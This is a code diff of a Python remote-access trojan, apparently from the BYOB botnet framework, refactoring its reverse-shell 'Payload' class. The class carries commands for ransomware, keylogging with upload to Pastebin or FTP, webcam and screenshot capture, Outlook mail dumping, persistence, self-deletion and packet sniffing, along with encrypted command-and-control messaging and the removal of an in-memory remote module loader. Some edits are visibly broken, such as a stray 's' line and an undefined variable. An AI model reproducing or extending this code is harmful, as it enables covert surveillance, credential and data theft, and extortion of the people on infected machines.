@@ -59,14 +59,20 @@ def threaded(function):
 class Payload():
     """ 
     Reverse TCP shell designed to provide remote access
-    to the host platform native terminal, enabling direct
-    control of the device from a remote server.
+    to the host's terminal, enabling direct control of the
+    device from a remote server.
 
     """
 
-    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
+    _encryption = {
+        0 : 'base64',
+        1 : 'xor',
+        2 : 'aes'
+    }
+
+    def __init__(self, host='127.0.0.1', port=1337):
         """ 
-        Create an instance of a reverse TCP shell 
+        Create a reverse TCP shell instance
 
         `Required`
         :param str host:          server IP address
@@ -74,11 +80,10 @@ class Payload():
 
         """
         self.handlers   = {}
+        self.remote     = []
         self.flags      = self._get_flags()
-        self.api        = self._get_api(pastebin=pastebin)
-        self.remote     = {"modules": [], "files": []}
-        self.connection = connect(host, port)
-        self.key        = diffiehellman(self.connection)
+        self.connection = self._get_connection(host, port)
+        self.key        = self._get_key(self.connection)
         self.info       = self._get_info()
 
     def _get_flags(self):
@@ -95,12 +100,32 @@ class Payload():
         logger.setLevel(logging.DEBUG if '--debug' in sys.argv else logging.ERROR)
         return logger
 
+    def _get_connection(self, host, port):
+        if not ipv4(host):
+            raise ValueError('invalid IPv4 address')
+        elif not (1 < int(port) < 65355):
+            raise ValueError('invalid port number')
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((host, port))
+            sock.setblocking(True)
+            return sock
+s
     def _get_remote(self, base_url=None):
         if self.flags.connection.is_set():
             if not base_url:
                 host, port = self.connection.getpeername()
                 base_url   = 'http://{}:{}'.format(host, port + 1)
-            self.resources = self._get_resources(target=self.remote['modules'], base_url='/'.join((base_url, 'modules')))
+            self.resources = self._get_resources(target=self.remote, base_url='/'.join((base_url, 'modules')))
+
+    def _get_key(self, conn):
+        if isinstance(conn, socket.socket):
+            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
+                return globals()['diffiehellman'](conn)
+            else:
+                raise Exception("unable to execute the Diffie-Hellman Internet Key Exchange (RFC 2741): missing required function 'diffiehellman'")
+        else:
+            raise TypeError("invalid object type for argument 'conn' (expected {}, received {})".format(socket.socket, type(conn)))
 
     def _get_info(self):
         for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
@@ -165,7 +190,7 @@ class Payload():
                 if globals()['_abort']:
                     break
             except Exception as e:
-                debug(e)
+                __logger__.error(e)
                 break
 
     @threaded
@@ -249,18 +274,15 @@ class Payload():
 
         `Optional`
         :param str filetype:  upload file type          (default: .txt)
-        :param str host:      FTP server hostname       (default: self.api.ftp.host)
-        :param str user:      FTP server login user     (default: self.api.ftp.user)
-        :param str password:  FTP server login password (default: self.api.ftp.password)
+        :param str host:      FTP server hostname       
+        :param str user:      FTP server login user     
+        :param str password:  FTP server login password 
 
         """
         try:
             for attr in ('host', 'user', 'password'):
-                if not attr in locals():
-                    if getattr(self.api.ftp, attr):
-                        locals()[attr] = getattr(self.api.ftp, attr)
-                    else:
-                        raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
+                if not locals().get(attr):
+                    raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
             path  = ''
             local = time.ctime().split()
             if os.path.isfile(str(source)):
@@ -331,7 +353,7 @@ class Payload():
                 path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                 return path
             except Exception as e:
-                debug("{} error: {}".format(self.wget.func_name, str(e)))
+                __logger__.error("{} error: {}".format(self.wget.func_name, str(e)))
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -350,9 +372,9 @@ class Payload():
                 try:
                     self.stop(thread)
                 except Exception as e:
-                    debug("{} error: {}".format(self.kill.func_name, str(e)))
+                    __logger__.error("{} error: {}".format(self.kill.func_name, str(e)))
         except Exception as e:
-            debug("{} error: {}".format(self.kill.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.kill.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
@@ -368,12 +390,12 @@ class Payload():
             try:
                 return help(self)
             except Exception as e:
-                debug("{} error: {}".format(self.help.func_name, str(e)))
+                __logger__.error("{} error: {}".format(self.help.func_name, str(e)))
         elif hasattr(self, name):
             try:
                 return help(getattr(self, name))
             except Exception as e:
-                debug("{} error: {}".format(self.help.func_name, str(e)))
+                __logger__.error("{} error: {}".format(self.help.func_name, str(e)))
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
 
@@ -400,7 +422,7 @@ class Payload():
             else:
                 return "Mode: passive" if self.flags.passive.is_set() else "Mode: active"
         except Exception as e:
-            debug(e)
+            __logger__.error(e)
         return self.mode.usage
 
 
@@ -420,7 +442,7 @@ class Payload():
                         try:
                             remove = getattr(persistence, 'remove_{}'.format(method))()
                         except Exception as e2:
-                            debug("{} error: {}".format(method, str(e2)))
+                            __logger__.error("{} error: {}".format(method, str(e2)))
             if not _debug:
                 delete(sys.argv[0])
         finally:
@@ -447,7 +469,7 @@ class Payload():
             else:
                 return "Job '{}' not found".format(target)
         except Exception as e:
-            debug("{} error: {}".format(self.stop.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.stop.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
@@ -485,7 +507,7 @@ class Payload():
             else:
                 return self.show.usage
         except Exception as e:
-            debug("'{}' error: {}".format(_threads.func_name, str(e)))
+            __logger__.error("'{}' error: {}".format(_threads.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
@@ -502,7 +524,7 @@ class Payload():
                 _ = zipfile.ZipFile(path).extractall('.')
                 return os.path.splitext(path)[0]
             except Exception as e:
-                debug("{} error: {}".format(self.unzip.func_name, str(e)))
+                __logger__.error("{} error: {}".format(self.unzip.func_name, str(e)))
         else:
             return "File '{}' not found".format(path)
 
@@ -523,7 +545,7 @@ class Payload():
 
         """
         if 'phone' not in globals():
-            phone = self.remote_import('phone')
+            phone = globals()['load']('phone')
         mode, _, args = str(args).partition(' ')
         if 'text' in mode:
             phone_number, _, message = args.partition(' ')
@@ -533,7 +555,7 @@ class Payload():
 
 
     @config(platforms=['win32','linux2','darwin'], command=False)
-    def imgur(self, source):
+    def imgur(self, source, api_key=None):
         """ 
         Upload image file/data to Imgur
 
@@ -542,9 +564,11 @@ class Payload():
 
         """
         try:
-            if getattr(self.api, 'imgur'):
-                key = self.api.imgur
-                api  = 'Client-ID {}'.format(key)
+            if api_key:
+                if not isinstance(api_key, str):
+                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
+                if not api.lower().startswith('client-id'):
+                    api  = 'Client-ID {}'.format(api_key)
                 if 'normalize' in globals():
                     source = normalize(source)
                 post = post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(source), 'type': 'base64'})
@@ -573,7 +597,7 @@ class Payload():
             else:
                 return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
         except Exception as e:
-            debug("{} error: {}".format(self.upload.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.upload.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
@@ -587,7 +611,7 @@ class Payload():
 
         """
         if 'ransom' not in globals():
-            ransom = self.remote_import('ransom')
+            ransom = globals()['load']('ransom')
         if not args:
             return self.ransom.usage
         cmd, _, action = str(args).partition(' ')
@@ -620,7 +644,7 @@ class Payload():
         """
         try:
             if 'webcam' not in globals():
-                webcam = self.remote_import('webcam')
+                webcam = globals()['load']('webcam')
             elif not args:
                 result = self.webcam.usage
             else:
@@ -646,12 +670,12 @@ class Payload():
 
         """
         try:
-            debug("{} failed - restarting in 3 seconds...".format(output))
+            __logger__.error("{} failed - restarting in 3 seconds...".format(output))
             self.kill()
             time.sleep(3)
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
-            debug("{} error: {}".format(self.restart.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.restart.func_name, str(e)))
 
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
@@ -667,7 +691,7 @@ class Payload():
 
         """
         if 'outlook' not in globals():
-            outlook = self.remote_import('outlook')
+            outlook = globals()['load']('outlook')
         elif not args:
             try:
                 if not outlook.installed():
@@ -691,7 +715,7 @@ class Payload():
                 else:
                     return "usage: outlook [mode]\n    mode: count, dump, search, results"
             except Exception as e:
-                debug("{} error: {}".format(self.email.func_name, str(e)))
+                __logger__.error("{} error: {}".format(self.email.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
@@ -721,7 +745,7 @@ class Payload():
                     self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
-                    debug("{} error: {}".format(self.execute.func_name, str(e)))
+                    __logger__.error("{} error: {}".format(self.execute.func_name, str(e)))
         else:
             return "File '{}' not found".format(str(path))
 
@@ -740,7 +764,7 @@ class Payload():
         """
         try:
             if 'process' not in globals():
-                process = self.remote_import('process')
+                process = globals()['load']('process')
             if not args:
                 if hasattr(process, 'usage'):
                     return process.usage
@@ -754,7 +778,7 @@ class Payload():
             else:
                 return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
-            debug("{} error: {}".format(self.process.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.process.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
@@ -769,7 +793,7 @@ class Payload():
         
         """
         if 'portscan' not in globals():
-            portscan = self.remote_import('portscan')
+            portscan = globals()['load']('portscan')
         try:
             if not args:
                 return 'portscan <mode> <target>'
@@ -786,10 +810,10 @@ class Payload():
             else:
                 return "Error: invalid mode '%s'" % mode
         except Exception as e:
-            debug("{} error: {}".format(self.portscan.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.portscan.func_name, str(e)))
             
 
-    def pastebin(self, source, dev_key=None, user_key=None):
+    def pastebin(self, source, api_key=None):
         """ 
         Dump file/data to Pastebin
 
@@ -797,13 +821,16 @@ class Payload():
         :param str source:      data or filename
 
         `Optional`
-        :param str api_key:     Pastebin api_dev_key  (default: Payload.api.pastebin.api_key)
-        :param str user_key:    Pastebin api_user_key (default: None)
+        :param str api_key:     Pastebin api_dev_key
+
+        Returns URL of pastebin document as a string
         
         """
         try:
-            if hasattr(self.api, 'pastebin'):
-                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': self.api.pastebin}
+            if api_key:
+                if not isinstance(api_key, str):
+                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
+                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                 paste = post('https://pastebin.com/api/api_post.php',data=info)
                 parts = urllib2.urlparse.urlsplit(paste)       
                 return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
@@ -813,7 +840,7 @@ class Payload():
             return '{} error: {}'.format(self.pastebin.func_name, str(e))
 
 
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger start/stop/dump/status')
     def keylogger(self, mode=None):
         """ 
         Log user keystrokes
@@ -831,21 +858,21 @@ class Payload():
                 length  = keylogger._buffer.tell()
                 return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
             except Exception as e:
-                debug("{} error: {}".format('keylogger.status', str(e)))
+                __logger__.error("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
-            keylogger = self.remote_import('keylogger')
+            keylogger = globals()['load']('keylogger')
         elif not mode:
             if 'keylogger' not in self.handlers:
                 return keylogger.usage
             else:
-                return status()      
+                return locals()['status']()      
         else:
             if 'run' in mode or 'start' in mode:
                 if 'keylogger' not in self.handlers:
                     self.handlers['keylogger'] = keylogger.run()
-                    return status()
+                    return locals()['status']()
                 else:
-                    return status()
+                    return locals()['status']()
             elif 'stop' in mode:
                 try:
                     self.stop('keylogger')
@@ -853,16 +880,16 @@ class Payload():
                 try:
                     self.stop('keylogger')
                 except: pass
-                return status()
+                return locals()['status']()
             elif 'auto' in mode:
                 self.handlers['keylogger'] = keylogger.auto()
-                return status()
+                return locals()['status']()
             elif 'upload' in mode:
                 result = pastebin(keylogger._buffer) if not 'ftp' in mode else ftp(keylogger._buffer)
                 keylogger.buffer.reset()
                 return result
             elif 'status' in mode:
-                return status()        
+                return locals()['status']()        
             else:
                 return keylogger.usage + '\n\targs: start, stop, dump'
 
@@ -878,13 +905,13 @@ class Payload():
         """
         try:
             if 'screenshot' not in globals():
-                screenshot = self.remote_import('screenshot')
+                screenshot = globals()['load']('screenshot')
             elif not mode in ('ftp','imgur'):
                 return "Error: invalid mode '%s'" % str(mode)
             else:
                 return screenshot.screenshot(mode)
         except Exception as e:
-            debug("{} error: {}".format(self.screenshot.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.screenshot.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
@@ -908,7 +935,7 @@ class Payload():
         """
         try:
             if not 'persistence' in globals():
-                persistence = self.remote_import('persistence')
+                persistence = globals()['load']('persistence')
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove'):
                 return self.persistence.usage + str('\nmethods: %s' % ', '.join(persistence.methods()))
@@ -917,7 +944,7 @@ class Payload():
                     persistence.methods[method].established, persistence.methods[method].result = persistence.methods[method].add()
             return json.dumps(persistence.results())
         except Exception as e:
-            debug("{} error: {}".format(self.persistence.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.persistence.func_name, str(e)))
         return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
 
 
@@ -933,7 +960,7 @@ class Payload():
         """
         try:
             if 'packetsniffer' not in globals():
-                packetsniffer = self.remote_import('packetsniffer')
+                packetsniffer = globals()['load']('packetsniffer')
             mode = None
             length = None
             cmd, _, action = str(args).partition(' ')
@@ -945,168 +972,7 @@ class Payload():
             self.handlers['packetsniffer'] = packetsniffer(mode, seconds=length)
             return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
-            debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))
-
-
-    def remote_import(self, modules):
-        """ 
-        Remotely import a module/package remotely from a server
-        directly into the currently running process without it
-        touching the disk
-
-        `Required`
-        :param list/str modules:   list of target module names
-        
-        """
-        host, port = self.connection.getpeername()
-        if isinstance(modules, str):
-            modules = modules.split(',')
-        if isinstance(modules, list):
-            for module in modules:
-                if module in self._modules:
-                    with remote_repo(self.remote['modules'], 'http://{}:{}/modules'.format(host, port + 1)):
-                        try:
-                            exec "import %s" % module in self.modules
-                            sys.modules[module] = globals()[module]
-                        except ImportError as e:
-                            debug(e)
-                elif module in self._packages:
-                    with remote_repo(self.remote['packages'], 'http://{}:{}/packages'.format(host, port + 1)):
-                        try:
-                            exec "import %s" % module in globals()
-                            sys.modules[module] = globals()[module]
-                        except ImportError as e:
-                            debug(e)
-                elif module in self.remote['files']:
-                    try:
-                        self.resources[module] = urllib2.urlopen('http://{}:{}/resources/{}'.format(host, port, module)).read()
-                        return self.resources[module]
-                    except Exception as e:
-                        debug(e)
-                else:
-                    try:
-                         return urllib2.urlopen('http://{}:{}/{}'.format(host, port, module)).read()
-                    except Exception as e:
-                        debug(e)
-        else:
-            raise TypeError('argument `modules` must be a list or string of module names separated by commas')
-
-    def diffiehellman(connection):
-        """ 
-        Diffie-Hellman Internet Key Exchange (RFC 2741)
-
-        `Requires`
-        :param socket connection:     socket.socket object
-
-        Returns the 256-bit binary digest of the SHA256 hash
-        of the shared session encryption key
-
-        """
-        if isinstance(connection, socket.socket):
-            g  = 2
-            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
-            xA = pow(g, a, p)
-            connection.send(Crypto.Util.number.long_to_bytes(xA))
-            xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
-            x  = pow(xB, a, p)
-            return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).digest()
-        else:
-            raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))
-
-    def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
-        """ 
-        XOR-128 encryption
-
-        `Required`
-        :param str data:        plaintext
-        :param str key:         256-bit key
-
-        `Optional`
-        :param int block_size:  block size
-        :param int key_size:    key size
-        :param int num_rounds:  number of rounds
-        :param str padding:     padding character
-
-        Returns encrypted ciphertext as base64-encoded string
-
-        """
-        data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
-        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-        vector  = os.urandom(8)
-        result  = [vector]
-        for block in blocks:
-            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
-            v0, v1  = struct.unpack("!2L", block)
-            k       = struct.unpack("!4L", key[:key_size])
-            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-            for round in range(num_rounds):
-                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-                sum = (sum + delta) & mask
-                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-            output  = vector = struct.pack("!2L", v0, v1)
-            result.append(output)
-        return base64.b64encode(bytes().join(result))
-
-    def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
-        """ 
-        XOR-128 encryption
-
-        `Required`
-        :param str data:        ciphertext
-        :param str key:         256-bit key
-
-        `Optional`
-        :param int block_size:  block size
-        :param int key_size:    key size
-        :param int num_rounds:  number of rounds
-        :param str padding:     padding character
-
-        Returns decrypted plaintext as string
-
-        """
-        data    = base64.b64decode(data)
-        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-        vector  = blocks[0]
-        result  = []
-        for block in blocks[1:]:
-            v0, v1 = struct.unpack("!2L", block)
-            k = struct.unpack("!4L", key[:key_size])
-            delta, mask = 0x9e3779b9L, 0xffffffffL
-            sum = (delta * num_rounds) & mask
-            for round in range(num_rounds):
-                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                sum = (sum - delta) & mask
-                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-            decode = struct.pack("!2L", v0, v1)
-            output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
-            vector = block
-            result.append(output)
-        return str().join(result).rstrip(padding)
-
-
-    def connect(self, host, port):
-        """ 
-        Create a streaming socket object and
-        make a TCP connection to the server
-        at the given address (host, port)
-
-        `Required`
-        :param str host:    IPv4 address
-        :param int port:    port number
-
-        Returns a connected `socket.socket` object
-
-        """
-        if not ipv4(host):
-            raise ValueError('invalid IPv4 address')
-        elif not (1 < int(port) < 65355):
-            raise ValueError('invalid port number')
-        else:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
-            sock.setblocking(True)
-            return sock
+            __logger__.error("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
     def send_task(self, task):
         """ 
@@ -1137,10 +1003,12 @@ class Payload():
         else:
             if self.flags.connection.wait(timeout=1.0):
                 if 'encrypt_aes' in globals() and callable(globals()['encrypt_aes']) and any([i for i in globals().copy() if 'Crypto' in i]):
-                    data = struct.pack('!L', 1) + globals()['encrypt_aes'](json.dumps(task), self.key)
+                    data = struct.pack('!L', 2) + globals()['encrypt_aes'](json.dumps(task), self.key)
+                elif 'encrypt_xor' in globals() and callable(globals()['encrypt_xor']):
+                    data = struct.pack('!L', 1) + globals()['encrypt_xor'](json.dumps(task), self.key)
                 else:
-                    data = struct.pack('!L', 0) + self.encrypt(json.dumps(task), self.key)
-                msg  = struct.pack('!L', len(data)) + data
+                    data = struct.pack('!L', 0) + base64.b64encode(json.dumps(task))
+                msg = struct.pack('!L', len(data)) + data
                 while True:
                     sent = self.connection.send(msg)
                     if len(msg) - sent:
@@ -1172,8 +1040,14 @@ class Payload():
                 msg += self.connection.recv(msg_len - len(msg))
             except (socket.timeout, socket.error):
                 break
-        if isinstance(msg, bytes) and len(msg):
-            data = decrypt_aes(msg, self.key)
+        mode     = struct.unpack('!L', msg[:hdr_len])[0]
+        msg      = msg[hdr_len:]
+        if mode in (1,2):
+            mode = 'decrypt_%s' % self._encryption[mode]
+            data = globals()[mode](msg, self.key)
+            return json.loads(data)
+        else:
+            data = base64.b64decode(msg)
             return json.loads(data)
 
     def run(self):
@@ -1183,9 +1057,6 @@ class Payload():
 
         """
         try:
-            for package in self.remote['packages']:
-                if package not in globals():
-                    self.remote_import(package)
             for target in ('prompt_handler','thread_handler'):
                 if not bool(target in self.handlers and self.handlers[target].is_alive()):
                     self.handlers[target]  = getattr(self, '_get_{}'.format(target))()
@@ -1204,8 +1075,8 @@ class Payload():
                             self.send_task(task)
                         self.flags.prompt.set()
                 else:
-                    debug("Connection timed out")
+                    __logger__.error("Connection timed out")
                     break
         except Exception as e:
-            debug("{} error: {}".format(self.run.func_name, str(e)))
+            __logger__.error("{} error: {}".format(self.run.func_name, str(e)))
 
